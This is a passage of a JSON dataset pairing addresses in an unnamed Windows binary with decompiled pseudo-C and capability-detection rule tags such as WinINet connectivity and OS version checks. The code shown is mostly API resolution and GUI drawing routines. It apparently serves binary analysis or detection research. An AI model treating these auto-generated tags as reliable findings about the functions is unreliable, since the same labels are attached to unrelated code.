0x42fde4);\n            *0x48598c = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42fdf4);\n            *0x485990 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42fdf4);\n            *0x485994 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42fe14);\n            *0x485998 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42fe28);\n            *0x48599c = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42fe3c);\n            *0x4859a0 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42fe50);\n            *0x4859a4 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42fe6c);\n            *0x4859a8 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42fe84);\n            *0x4859ac = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42fe94);\n            *0x4859b0 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42fea4);\n            *0x4859b4 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42feb8);\n            *0x4859b8 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42fee0);\n            *0x4859bc = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42fef0);\n            *0x4859c0 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42ff00);\n            *0x4859c4 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42ff10);\n            *0x4859c8 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42ff20);\n            *0x4859cc = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42ff2c);\n            *0x4859d0 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42ff40);\n            *0x4859d4 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42ff54);\n            *0x4859d8 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42ff64);\n            *0x4859dc = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42ff74);\n            *0x4859e0 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42ff84);\n            *0x4859e4 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42ff94);\n            *0x4859e8 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42ffac);\n            *0x4859ec = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42ffbc);\n            *0x4859f0 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42ffd0);\n            *0x4859f4 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42ffe4);\n            *0x4859f8 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42fffc);\n            *0x4859fc = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x43000c);\n            *0x485a00 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x43001c);\n            *0x485a04 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x43002c);\n            *0x485a08 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x430040);\n            *0x485a0c = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x430050);\n            *0x485a10 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x430060);\n            *0x485a14 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x43006c);\n            *0x485a18 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x43007c);\n            *0x485a1c = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x430098);\n            *0x485a20 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x4300b4);\n            *0x485a24 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x4300cc);\n            *0x485a28 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x4300e4);\n            *0x485a2c = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x4300f8);\n            *0x485a30 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x430118);\n            in_stack_fffffe6c = *0x485a3c;\n            *0x485a34 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x430134);\n        }\n    }\n    *in_FS_OFFSET = in_stack_fffffe6c;\n    fcn.0042f7e0(0x42fd9a);\n    return;\n}\n",
        "token_count": 1787
    },
    "00430144": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00430144(void)\n\n{\n    int32_t iVar1;\n    \n    if (((*0x485a3c != 0) && (iVar1 = (**0x485a10)(),  iVar1 != 0)) && (iVar1 = (**0x485a0c)(),  iVar1 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 88
    },
    "0043016c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043016c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x4301b4;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x485a38 = *0x485a38 + 1;\n    if (*0x485a38 == 0) {\n        while (0 < *0x485a40) {\n            fcn.0042f820();\n        }\n        fcn.00403820();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 163
    },
    "00430404": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00430404(void)\n\n{\n    if (*0x485a4c == 0) {\n        *0x485a4c = (**(*0x48390c + 4))();\n    }\n    return *0x485a4c;\n}\n",
        "token_count": 61
    },
    "004304cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004304cc(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if ((*(in_EAX + 6) != '\\0') && (*(in_EAX + 8 + (param_2 & 0xff) * 4) == 0)) {\n        uVar1 = (***0x484408)(0, *((param_2 & 0x7f) * 4 + 0x483914));\n        *(in_EAX + 8 + (param_2 & 0x7f) * 4) = uVar1;\n    }\n    return *(in_EAX + 8 + (param_2 & 0xff) * 4);\n}\n",
        "token_count": 170
    },
    "0043050c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043050c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 5) != '\\0') && (*(in_EAX + 6) != '\\0')) && (*(in_EAX + 4) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 76
    },
    "0043060c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043060c(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint in_ECX;\n    uint in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_ch == '\\0') || (arg_10h == 0)) {\n        cVar1 = '\\x01';\n    }\n    else {\n        uVar2 = fcn.004304cc(*(arg_10h + 4), *(arg_10h + 8));\n        iVar3 = (***0x4843f4)(uVar2);\n        cVar1 = '\\x01' - (iVar3 == 0);\n    }\n    if (cVar1 != '\\0') {\n        (***0x484638)(in_EDX, in_ECX, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 213
    },
    "00430c90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00430c90(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 6) != '\\0') {\n        fcn.00430538();\n    }\n    uVar1 = fcn.00430144();\n    *(in_EAX + 6) = uVar1;\n    return;\n}\n",
        "token_count": 82
    },
    "00430cac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00430cac(void)\n\n{\n    uchar *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x430cf1;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x485a48 = *0x485a48 + 1;\n    if (*0x485a48 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (**0x4842cc == '\\0') {\n            fcn.00403820();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.004045c8();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 197
    },
    "004332ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2dh\n// WARNING: Variable defined which should be unmapped: var_29h\n// WARNING: Variable defined which should be unmapped: var_3dh\n// WARNING: Variable defined which should be unmapped: var_39h\n// WARNING: Variable defined which should be unmapped: var_21h\n// WARNING: Variable defined which should be unmapped: var_1dh\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004332ac(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint uVar3;\n    uchar extraout_var;\n    uint32_t uVar4;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint32_t uStackY120;\n    uint uStackY116;\n    uint uStackY112;\n    int32_t var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint *var_5ch;\n    uint32_t var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    uint *puStackY76;\n    uint32_t uStackY72;\n    uchar auStack68 [3];\n    uint var_3dh;\n    uint var_39h;\n    uchar uStack57;\n    uint arg_ch;\n    uint var_2dh;\n    uint var_29h;\n    uint var_25h;\n    int32_t var_21h;\n    uint var_1dh;\n    uint32_t var_19h;\n    uint var_15h;\n    uint uStack21;\n    int32_t var_dh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1dh._1_1_ = 0xfc;\n    *0x4 = 0x11;\n    do {\n        var_4h = 0;\n        *0x4 = *0x4 + -1;\n    } while (*0x4 != 0);\n    var_dh._0_1_ = unaff_EBX >> 0x18;\n    uStack21._0_1_ = unaff_ESI >> 0x18;\n    uStack21 = CONCAT31(unaff_EBX, uStack21);\n    var_15h._0_1_ = unaff_EDI >> 0x18;\n    var_15h = CONCAT31(unaff_ESI, var_15h);\n    var_1dh._2_2_ = &stack0xfffffffc >> 8;\n    var_19h._0_1_ = &stack0xfffffffc >> 0x18;\n    var_19h = CONCAT31(unaff_EDI, var_19h);\n    var_1dh._0_1_ = 0;\n    uVar3 = *in_FS_OFFSET;\n    var_25h._1_1_ = uVar3;\n    var_25h._2_2_ = uVar3 >> 8;\n    var_21h._0_1_ = uVar3 >> 0x18;\n    var_21h = CONCAT31(0x43364e, var_21h);\n    *in_FS_OFFSET = &fcn.004332ac::var_25h + 1;\n    var_29h._1_1_ = 0xdf;\n    var_29h._2_2_ = 0x4332;\n    var_25h._0_1_ = 0;\n    fcn.00426f6c();\n    var_29h._1_1_ = 0xe4;\n    var_29h._2_2_ = 0x4332;\n    var_25h._0_1_ = 0;\n    fcn.00430404();\n    var_29h._1_1_ = 0xe9;\n    var_29h._2_2_ = 0x4332;\n    var_25h._0_1_ = 0;\n    cVar2 = fcn.0043050c();\n    if (cVar2 == '\\0') {\n        var_29h._1_1_ = 0x79;\n        var_29h._2_2_ = 0x4334;\n        var_25h._0_1_ = 0;\n        var_4h = fcn.00426ec8();\n        iVar1 = in_EAX[0x13];\n        var_29h._1_1_ = iVar1;\n        var_29h._2_2_ = iVar1 >> 8;\n        var_25h._0_1_ = iVar1 >> 0x18;\n        var_2dh._1_1_ = SUB41(&fcn.004332ac::var_1dh, 0);\n        var_2dh._2_2_ = &fcn.004332ac::var_1dh >> 8;\n        var_29h._0_1_ = &fcn.004332ac::var_1dh >> 0x18;\n        var_2dh._0_1_ = 0;\n        fcn.0041b080(&fcn.004332ac::var_1dh, iVar1);\n        if (*(in_EAX + 0x1a5) == '\\0') {\n            var_2dh._0_1_ = 0;\n            fcn.00426904();\n        }\n        else {\n            iVar1 = CONCAT22(var_1dh._2_2_, CONCAT11(var_1dh._1_1_, var_1dh)) + 1;\n            var_1dh._0_1_ = iVar1;\n            var_1dh._1_1_ = iVar1 >> 8;\n            var_1dh._2_2_ = iVar1 >> 0x10;\n            var_19h = var_19h + 1;\n            var_2dh._0_1_ = 0;\n            fcn.00426904();\n            var_2dh._0_1_ = 0;\n            fcn.00426ce4();\n            var_2dh._0_1_ = 0xff;\n            var_39h._1_1_ = SUB41(&fcn.004332ac::var_1dh, 0);\n            var_39h._2_2_ = &fcn.004332ac::var_1dh >> 8;\n            uStack57 = &fcn.004332ac::var_1dh >> 0x18;\n            var_3dh._1_1_ = 0xcc;\n            var_3dh._2_2_ = 0x4334;\n            var_39h._0_1_ = 0;\n            sub.user32.dll_OffsetRect();\n            var_3dh._1_1_ = 0xd9;\n            var_3dh._2_2_ = 0x4334;\n            var_39h._0_1_ = 0;\n            fcn.00426904();\n        }\n        var_3dh._1_1_ = 0xf2;\n        var_3dh._2_2_ = 0x4334;\n        var_39h._0_1_ = 0;\n        fcn.00426ce4();\n        var_3dh._1_1_ = 0xfc;\n        var_3dh._2_2_ = 0x4334;\n        var_39h._0_1_ = 0;\n        fcn.0043d848();\n        if (var_68h != 0) {\n            var_3dh._1_1_ = 0x11;\n            var_3dh._2_2_ = 0x4335;\n            var_39h._0_1_ = 0;\n            cVar2 = fcn.00403a28();\n            var_3dh._1_1_ = var_4h;\n            var_39h._0_1_ = var_4h >> 0x18;\n            var_3dh._2_2_ = var_4h >> 8;\n            if (cVar2 == '\\0') {\n                _auStack68 = &fcn.004332ac::var_1dh;\n                uStackY72 = 0x43352b;\n                fcn.0041b080(_auStack68, var_4h);\n            }\n            else {\n                _auStack68 = &fcn.004332ac::var_78h;\n                uStackY72 = 0x43353f;\n                fcn.0043d848();\n                uStackY72 = 0x43354d;\n                fcn.00426eac();\n                uStackY72 = 0x433560;\n                fcn.0041b080(_auStack68, CONCAT13(var_39h, CONCAT21(var_3dh._2_2_, var_3dh._1_1_)));\n                var_1dh._0_1_ = var_78h;\n                var_1dh._1_1_ = var_78h >> 8;\n                var_1dh._2_2_ = var_78h >> 0x10;\n                var_19h = uStackY120;\n                var_15h = uStackY116;\n                uStack21 = uStackY112;\n            }\n            uStackY72 = 0x433578;\n            uVar4 = fcn.0043fb30();\n            uStackY72 = uVar4 | 0x400;\n            puStackY76 = &fcn.004332ac::var_1dh;\n            var_4ch = 0x433590;\n            fcn.0043d848();\n            var_4ch = 0x433598;\n            var_4ch = fcn.00404888();\n            var_50h = 0x4335a6;\n            fcn.0043d848();\n            var_50h = 0x4335b1;\n            var_50h = fcn.00404a88();\n            var_54h = 0x4335b9;\n            var_54h = fcn.0042704c();\n            var_58h = 0x4335bf;\n            sub.user32.dll_DrawTextA();\n            var_58h = 0x4335ca;\n            fcn.00426904();\n            var_5ch = &fcn.004332ac::var_1dh;\n            var_60h = 0x4335dc;\n            var_58h = uVar4;\n            fcn.0043d848();\n            var_60h = 0x4335e7;\n            var_60h = fcn.00404888();\n            var_64h = 0x4335f5;\n            fcn.0043d848();\n            var_64h = 0x433600;\n            var_64h = fcn.00404a88();\n            var_68h = 0x433608;\n            var_68h = fcn.0042704c();\n            uStackY112 = 0x43360e;\n            sub.user32.dll_DrawTextA();\n        }\n    }\n    else {\n        var_29h._1_1_ = 0xfb;\n        var_29h._2_2_ = 0x4332;\n        var_25h._0_1_ = 0;\n        fcn.0043d848();\n        if (var_50h == 0) {\n            var_29h._1_1_ = 0;\n            var_29h._2_2_ = 0;\n            var_25h._0_1_ = 0;\n            var_2dh._1_1_ = SUB41(&fcn.004332ac::var_2dh, 0);\n            var_2dh._2_2_ = &fcn.004332ac::var_2dh >> 8;\n            var_29h._0_1_ = &fcn.004332ac::var_2dh >> 0x18;\n            var_2dh._0_1_ = 0;\n            fcn.0041b080(&fcn.004332ac::var_2dh, 0);\n        }\n        else {\n            iVar1 = &fcn.004332ac::var_dh + 1;\n            var_29h._1_1_ = iVar1;\n            var_29h._2_2_ = iVar1 >> 8;\n            var_25h._0_1_ = iVar1 >> 0x18;\n            var_2dh._1_1_ = 0x13;\n            var_2dh._2_2_ = 0x4333;\n            var_29h._0_1_ = 0;\n            fcn.0043d848();\n            var_2dh._1_1_ = 0x1b;\n            var_2dh._2_2_ = 0x4333;\n            var_29h._0_1_ = 0;\n            uVar3 = fcn.00404888();\n            var_2dh._1_1_ = uVar3;\n            var_2dh._2_2_ = uVar3 >> 8;\n            var_29h._0_1_ = uVar3 >> 0x18;\n            var_2dh._0_1_ = 0;\n            fcn.0043d848();\n            var_2dh._0_1_ = 0;\n            fcn.00404a88();\n            var_2dh._0_1_ = extraout_var;\n            fcn.0042704c();\n            var_39h._1_1_ = 0x3c;\n            var_39h._2_2_ = 0x4333;\n            uStack57 = 0;\n            sub.gdi32.dll_GetTextExtentPoint32A();\n            var_39h._1_1_ = var_8h;\n            var_39h._2_2_ = var_8h >> 8;\n            uStack57 = var_8h >> 0x18;\n            var_3dh._1_1_ = SUB41(&fcn.004332ac::var_2dh, 0);\n            var_3dh._2_2_ = &fcn.004332ac::var_2dh >> 8;\n            var_39h._0_1_ = &fcn.004332ac::var_2dh >> 0x18;\n            _auStack68 = 0x433350;\n            fcn.0041b080(&fcn.004332ac::var_2dh, var_8h);\n            _auStack68 = 0x43335b;\n            cVar2 = fcn.00403a28();\n            if (cVar2 == '\\0') {\n                _auStack68 = NULL;\n                uStackY72 = 8;\n                puStackY76 = &fcn.004332ac::var_2dh;\n                var_4ch = 0x43336c;\n                sub.user32.dll_OffsetRect();\n            }\n            else {\n                _auStack68 = NULL;\n                uStackY72 = (in_EAX[0x12] + -8) - CONCAT22(var_25h._2_2_, CONCAT11(var_25h._1_1_, var_25h));\n                puStackY76 = &fcn.004332ac::var_2dh;\n                var_4ch = 0x433383;\n                sub.user32.dll_OffsetRect();\n            }\n        }\n        var_2dh._0_1_ = 0;\n        (**(*in_EAX + 0x44))();\n        var_2dh._0_1_ = var_21h >> 0x18;\n        var_39h._1_1_ = var_29h;\n        var_39h._2_2_ = CONCAT22(var_29h._2_2_, CONCAT11(var_29h._1_1_, var_29h)) >> 8;\n        uStack57 = var_29h._2_2_ >> 8;\n        var_3dh._1_1_ = var_2dh;\n        var_3dh._2_2_ = CONCAT22(var_2dh._2_2_, CONCAT11(var_2dh._1_1_, var_2dh)) >> 8;\n        var_39h._0_1_ = var_2dh._2_2_ >> 8;\n        _auStack68 = 0x4333c7;\n        _auStack68 = fcn.0042704c();\n        uStackY72 = 0x4333cd;\n        sub.gdi32.dll_ExcludeClipRect();\n        uStackY72 = 0x4333d4;\n        cVar2 = (**(*in_EAX + 0x50))();\n        if (cVar2 == '\\0') {\n            var_dh._0_1_ = 0x1c;\n        }\n        else {\n            var_dh._0_1_ = 0x1b;\n        }\n        var_1dh._1_1_ = 0xe7;\n        var_1dh._2_2_ = 0x4333;\n        var_19h = var_19h & 0xffffff00;\n        fcn.00430404();\n        var_1dh._1_1_ = 0xf2;\n        var_1dh._2_2_ = 0x4333;\n        var_19h = var_19h & 0xffffff00;\n        fcn.004306d8();\n        var_1dh._1_1_ = SUB41(&fcn.004332ac::var_3dh, 0);\n        var_1dh._2_2_ = &fcn.004332ac::var_3dh >> 8;\n        var_19h = var_19h & 0xffffff00 | &fcn.004332ac::var_3dh >> 0x18;\n        var_1dh._0_1_ = 0;\n        var_25h._1_1_ = 0xff;\n        var_25h._2_2_ = 0x4333;\n        var_21h._1_3_ = 0;\n        var_21h._0_1_ = 0;\n        uVar3 = fcn.0042704c();\n        var_25h._1_1_ = uVar3;\n        var_25h._2_2_ = uVar3 >> 8;\n        var_21h._0_1_ = uVar3 >> 0x18;\n        var_29h._1_1_ = 5;\n        var_29h._2_2_ = 0x4334;\n        var_25h._0_1_ = 0;\n        fcn.00430404();\n        var_25h._1_1_ = 0xe;\n        var_25h._2_2_ = 0x4334;\n        var_21h._0_1_ = 0;\n        fcn.004305c8(CONCAT13(var_1dh, var_21h._1_3_), CONCAT13(var_19h, CONCAT21(var_1dh._2_2_, var_1dh._1_1_)));\n        var_25h._1_1_ = 0;\n        var_25h._2_2_ = 0;\n        var_21h = var_21h._1_3_ << 8;\n        var_29h._1_1_ = 0x17;\n        var_29h._2_2_ = 0x4334;\n        var_25h._0_1_ = 0;\n        uVar3 = fcn.0042704c();\n        var_39h._1_1_ = uVar3;\n        var_39h._2_2_ = uVar3 >> 8;\n        uStack57 = uVar3 >> 0x18;\n        var_2dh._1_1_ = 0x1d;\n        var_2dh._2_2_ = 0x4334;\n        var_29h._0_1_ = 0;\n        sub.gdi32.dll_SelectClipRgn();\n        var_2dh._1_1_ = 0x27;\n        var_2dh._2_2_ = 0x4334;\n        var_29h._0_1_ = 0;\n        fcn.0043d848();\n        if (var_5ch != NULL) {\n            var_2dh._1_1_ = 0x3b;\n            var_2dh._2_2_ = 0x4334;\n            var_29h._0_1_ = 0;\n            fcn.0043d848();\n            var_2dh._1_1_ = 0x46;\n            var_2dh._2_2_ = 0x4334;\n            var_29h._0_1_ = 0;\n            fcn.00404e20();\n            var_2dh._1_1_ = var_60h;\n            var_2dh._2_2_ = var_60h >> 8;\n            var_29h._0_1_ = var_60h >> 0x18;\n            var_2dh._0_1_ = &fcn.004332ac::var_2dh >> 0x18;\n            arg_ch = 0;\n            var_39h._1_1_ = 0;\n            var_39h._2_2_ = 0;\n            uStack57 = 0;\n            var_3dh._1_1_ = 0x59;\n            var_3dh._2_2_ = 0x4334;\n            var_39h._0_1_ = 0;\n            uVar3 = fcn.0042704c();\n            var_3dh._1_1_ = uVar3;\n            var_3dh._2_2_ = uVar3 >> 8;\n            var_39h._0_1_ = uVar3 >> 0x18;\n            _auStack68 = 0x43345f;\n            fcn.00430404();\n            var_3dh._1_1_ = 0x68;\n            var_3dh._2_2_ = 0x4334;\n            var_39h._0_1_ = 0;\n            fcn.00430674(CONCAT13(uStack57, CONCAT21(var_39h._2_2_, var_39h._1_1_)), arg_ch, \n                         &fcn.004332ac::var_2dh & 0xffffff | var_2dh << 0x18, \n                         CONCAT13(var_29h, CONCAT21(var_2dh._2_2_, var_2dh._1_1_)));\n        }\n    }\n    *in_FS_OFFSET = CONCAT13(uStack57, CONCAT21(var_39h._2_2_, var_39h._1_1_));\n    var_2dh._0_1_ = 0;\n    fcn.004045ec();\n    fcn.004045ec();\n    fcn.00404cd4();\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 5191
    },
    "004337d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0043380f)\n// WARNING: Removing unreachable block (ram,0x00433818)\n// WARNING: Removing unreachable block (ram,0x00433820)\n\nvoid __fastcall fcn.004337d8(uint32_t param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x43392e;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    (**(*in_EAX + 0x90))();\n    if ((param_1 & 0x400) != 0) {\n        fcn.00404890();\n    }\n    uVar2 = fcn.0043fb30();\n    fcn.00426f6c();\n    cVar1 = (**(*in_EAX + 0x50))();\n    if (cVar1 == '\\0') {\n        sub.user32.dll_OffsetRect(param_2, 1, 1);\n        fcn.00426138();\n        uVar4 = param_2;\n        uVar3 = fcn.00404888(param_2, uVar2);\n        uVar3 = fcn.00404a88(uVar3);\n        uVar3 = fcn.0042704c(uVar3);\n        sub.user32.dll_DrawTextA(uVar3);\n        sub.user32.dll_OffsetRect(param_2, 0xffffffff, 0xffffffff);\n        fcn.00426138();\n        uVar2 = fcn.00404888(param_2, uVar2);\n        uVar2 = fcn.00404a88(uVar2);\n        uVar2 = fcn.0042704c(uVar2);\n        sub.user32.dll_DrawTextA(uVar2);\n    }\n    else {\n        uVar2 = fcn.00404888(param_2, uVar2);\n        uVar2 = fcn.00404a88(uVar2);\n        uVar4 = fcn.0042704c(uVar2);\n        sub.user32.dll_DrawTextA();\n    }\n    *in_FS_OFFSET = uVar4;\n    fcn.004045c8(0x433935);\n    return;\n}\n",
        "token_count": 554
    },
    "00433c90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00433c90(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x433d1d;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (in_EAX[0x5a] != 0) {\n        cVar2 = (**(*in_EAX + 0x50))();\n        if ((cVar2 != '\\0') && (*(in_EAX + 0x5c) != '\\0')) {\n            fcn.0043d848();\n            cVar2 = fcn.0045444c();\n            if (cVar2 != '\\0') {\n                piVar1 = in_EAX[0x5a];\n                cVar2 = fcn.00403a28();\n                if (cVar2 != '\\0') {\n                    (**(*piVar1 + 0xc4))();\n                    *(param_2 + 0xc) = 1;\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x433d24;\n    uStack28 = 0x433d1c;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 344
    },
    "00434448": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00434448(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x20f) != '\\0') && (*(in_EAX + 0x20c) == '\\x01')) {\n        *(in_EAX + 0x50) = *0x434480 | *(in_EAX + 0x50);\n        fcn.00434484();\n        return;\n    }\n    *(in_EAX + 0x50) = ~*0x434480 & *(in_EAX + 0x50);\n    return;\n}\n",
        "token_count": 130
    },
    "00434484": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
